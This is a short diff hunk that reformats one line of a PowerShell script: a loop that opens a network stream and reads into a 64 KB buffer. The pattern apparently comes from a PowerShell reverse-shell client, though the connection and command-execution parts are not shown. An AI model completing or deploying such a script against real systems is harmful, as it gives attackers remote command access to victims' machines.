@@ -15,7 +15,8 @@ while ($True) {
         
     }
     
-    $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object { 0 };
+    $stream = $client.GetStream(); 
+    [byte[]]$bytes = 0..65535 | ForEach-Object { 0 };
     
     try {
         while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
